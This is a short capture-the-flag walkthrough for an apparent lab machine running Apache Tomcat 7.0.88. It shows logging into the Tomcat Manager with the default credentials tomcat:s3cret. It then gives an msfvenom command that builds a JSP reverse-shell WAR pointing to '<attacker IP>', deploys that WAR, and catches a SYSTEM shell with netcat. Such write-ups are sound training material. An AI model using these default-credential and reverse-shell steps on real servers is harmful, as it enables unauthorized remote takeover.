@@ -1,0 +1,43 @@
+Run a normal nmap command
+
+
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+
+Now enter http://10.10.10.95:8080 --> It prompts with HTTP authentication
+
+We search in google for Apache default passwords, we easily found tomcat:s3cret
+
+So login with this credential 
+
+Navigate to Manager page by clicking Manager button, it redirects to /manager/html
+
+Here we find a file upload option for war file
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=1234 -f war > shell.war
+
+upload the generate .war file and click deploy button, the UI on the top shows "ok" to 
+confirm the successful upload
+
+We can find the uploaded file in the list of applications in the bottom.
+
+setup netcat listener and click on shell.war link, we got shell for NT AUTHORITY/SYSTEM
+
+Use "dir" command to check directories and "cd.." go back to origin directory C:/
+Use dir and cd to get to the Desktop
+C:/ > Administrator > Desktop > flag
+
+In "flag" directory , we can see 2 other directories and 1 file name 
+irectory of C:\Users\Administrator\Desktop\flags
+
+06/19/2018  07:09 AM    <DIR>          .
+06/19/2018  07:09 AM    <DIR>          ..
+06/19/2018  07:11 AM                88 2 for the price of 1.txt
+               1 File(s)             88 bytes
+               2 Dir(s)  27,602,952,192 bytes free
+
+The file has flags for both user and root. "2 for the price of 1.txt"
+
